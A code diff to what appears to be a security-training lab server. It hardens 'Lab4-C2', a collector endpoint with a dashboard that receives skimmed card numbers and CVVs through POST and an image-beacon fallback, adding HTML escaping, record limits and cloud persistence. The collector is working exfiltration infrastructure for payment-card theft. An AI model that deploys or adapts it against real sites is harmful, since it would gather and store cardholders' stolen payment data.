@@ -56,8 +56,8 @@ async function gcsSaveJSON(lab, name, data) {
   )
 }
 
-async function gcsListJSON(lab, prefix) {
-  const [files] = await gcs.bucket(BUCKETS[lab]).getFiles({ prefix })
+async function gcsListJSON(lab, prefix, options = {}) {
+  const [files] = await gcs.bucket(BUCKETS[lab]).getFiles({ prefix, ...options })
   return files
 }
 
@@ -122,6 +122,16 @@ function maskCardNumber(cardNumber) {
 function sanitizeForLog(input) {
   if (typeof input !== 'string') input = String(input)
   return input.replace(/[\r\n\t\x00-\x1f\x7f]/g, ' ').substring(0, 500)
+}
+
+function escapeHTML(input) {
+  if (input === undefined || input === null) return ''
+  return String(input)
+    .replace(/&/g, '&amp;')
+    .replace(/</g, '&lt;')
+    .replace(/>/g, '&gt;')
+    .replace(/"/g, '&quot;')
+    .replace(/'/g, '&#39;')
 }
 
 function uniqueSuffix() {
@@ -807,6 +817,8 @@ app.get('/health', (req, res) => {
 
 let lab4Records = []
 let lab4Stats = { totalRecords: 0, startTime: Date.now() }
+const LAB4_MAX_RECORDS = 1000
+const LAB4_PRELOAD_LIMIT = 500
 
 async function lab4SaveRecord(record) {
   if (useGCS('lab4')) {
@@ -822,9 +834,19 @@ async function lab4SaveRecord(record) {
 async function lab4Preload() {
   if (!useGCS('lab4')) return
   try {
-    const files = await gcsListJSON('lab4', 'records/')
-    const entries = await Promise.all(files.map(f => gcsDownloadJSON(f).catch(() => null)))
+    const files = await gcsListJSON('lab4', 'records/', { maxResults: LAB4_PRELOAD_LIMIT })
+    const sortedFiles = files
+      .map(file => ({
+        file,
+        updated: Date.parse(file.metadata?.updated || file.metadata?.timeCreated || 0) || 0
+      }))
+      .sort((a, b) => b.updated - a.updated)
+      .slice(0, LAB4_PRELOAD_LIMIT)
+    const entries = await Promise.all(sortedFiles.map(f => gcsDownloadJSON(f.file).catch(() => null)))
     lab4Records = entries.filter(Boolean)
+    if (lab4Records.length > LAB4_MAX_RECORDS) {
+      lab4Records = lab4Records.slice(-LAB4_MAX_RECORDS)
+    }
     lab4Stats.totalRecords = lab4Records.length
     console.log(`[Lab4-C2] Preloaded ${lab4Records.length} records from GCS`)
   } catch (e) {
@@ -855,7 +877,9 @@ app.post('/lab4/c2/collect', async (req, res) => {
 
   lab4Records.push(record)
   lab4Stats.totalRecords++
-  if (lab4Records.length > 1000) lab4Records = lab4Records.slice(-1000)
+  if (lab4Records.length > LAB4_MAX_RECORDS) {
+    lab4Records = lab4Records.slice(-LAB4_MAX_RECORDS)
+  }
 
   try { await lab4SaveRecord(record) } catch (e) { console.error('[Lab4-C2] Save error:', e.message) }
 
@@ -863,17 +887,28 @@ app.post('/lab4/c2/collect', async (req, res) => {
 })
 
 // GET /lab4/c2/collect — image beacon fallback (sendBeacon with GET)
-app.get('/lab4/c2/collect', (req, res) => {
+app.get('/lab4/c2/collect', async (req, res) => {
   const q = req.query
   if (q.card_number) {
     const raw = String(q.card_number).replace(/[\s-]/g, '')
-    lab4Records.push({
-      id: `stego-${Date.now()}-beacon`,
+    const record = {
+      id: `stego-${Date.now()}-${Math.random().toString(36).slice(2, 8)}`,
       timestamp: new Date().toISOString(),
       masked_card: raw.slice(0, 4) + ' **** **** ' + raw.slice(-4),
-      cvv: q.cvv, source: 'beacon', url: q.url
-    })
+      cvv: q.cvv,
+      source: 'beacon',
+      url: q.url
+    }
+    lab4Records.push(record)
     lab4Stats.totalRecords++
+    if (lab4Records.length > LAB4_MAX_RECORDS) {
+      lab4Records = lab4Records.slice(-LAB4_MAX_RECORDS)
+    }
+    try {
+      await lab4SaveRecord(record)
+    } catch (error) {
+      console.error('[Lab4-C2] Save error (beacon):', error.message)
+    }
   }
   const gif = Buffer.from('R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7', 'base64')
   res.set('Content-Type', 'image/gif').send(gif)
@@ -896,14 +931,23 @@ app.get('/lab4/c2/health', (req, res) => {
 
 function generateLab4Dashboard() {
   const recent = lab4Records.slice(-20).reverse()
-  const cardDivs = recent.map(r => `
-    <div class="card-record" style="background:#1a1a2e;border:1px solid #e94560;border-radius:8px;padding:15px;margin:10px 0;">
-      <div style="font-size:1.1em;font-weight:bold;color:#e94560;">${r.masked_card || 'N/A'}</div>
-      <div style="color:#aaa;margin-top:4px;font-size:0.85em;">
-        CVV: ${r.cvv || '???'} &nbsp;|&nbsp; Expiry: ${r.expiry || 'N/A'} &nbsp;|&nbsp; Name: ${r.card_name || 'N/A'}
-      </div>
-      <div style="color:#666;font-size:0.8em;margin-top:4px;">${r.timestamp} &nbsp;•&nbsp; ${r.source || ''}</div>
-    </div>`).join('')
+  const cardDivs = recent.map(r => {
+    const maskedCard = escapeHTML(r.masked_card || 'N/A')
+    const cvvValue = escapeHTML(r.cvv || '???')
+    const expiry = escapeHTML(r.expiry || 'N/A')
+    const cardName = escapeHTML(r.card_name || 'N/A')
+    const timestamp = escapeHTML(r.timestamp || '')
+    const source = escapeHTML(r.source || '')
+
+    return `
+      <div class="card-record" style="background:#1a1a2e;border:1px solid #e94560;border-radius:8px;padding:15px;margin:10px 0;">
+        <div style="font-size:1.1em;font-weight:bold;color:#e94560;">${maskedCard}</div>
+        <div style="color:#aaa;margin-top:4px;font-size:0.85em;">
+          CVV: ${cvvValue} &nbsp;|&nbsp; Expiry: ${expiry} &nbsp;|&nbsp; Name: ${cardName}
+        </div>
+        <div style="color:#666;font-size:0.8em;margin-top:4px;">${timestamp} &nbsp;•&nbsp; ${source}</div>
+      </div>`
+  }).join('')
 
   return `<!DOCTYPE html><html><head><title>Lab 4 Steganography C2 Dashboard</title><meta charset="utf-8">
     <style>body{font-family:'Courier New',monospace;max-width:1000px;margin:0 auto;padding:20px;background:#0f0f1a;color:#e0e0e0}
